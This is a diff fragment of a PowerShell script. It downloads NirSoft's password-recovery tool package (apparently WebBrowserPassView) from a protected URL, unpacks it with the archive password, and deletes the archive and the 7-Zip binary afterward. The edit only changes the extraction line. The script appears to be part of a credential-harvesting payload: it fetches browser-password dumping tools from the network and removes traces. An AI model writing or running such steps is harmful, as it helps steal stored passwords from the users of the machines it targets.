@@ -12,7 +12,7 @@ $headers = @{
 };
 
 Invoke-WebRequest -Headers $headers -Uri https://www.nirsoft.net/protected_downloads/passreccommandline.zip -OutFile wbpv.zip | Wait-Process;
-Start-Process -FilePath ".\7z.exe" -ArgumentList "e `"wbpv.zip`" -p`"nirsoft123!`" -o`"wbpv`" -y" -Wait;
+.\7z.exe e "wbpv.zip" -p"nirsoft123!" -o"wbpv" -y -Wait;
 
 Remove-Item "wbpv.zip" -Force;
 Remove-Item "7z.exe" -Force;
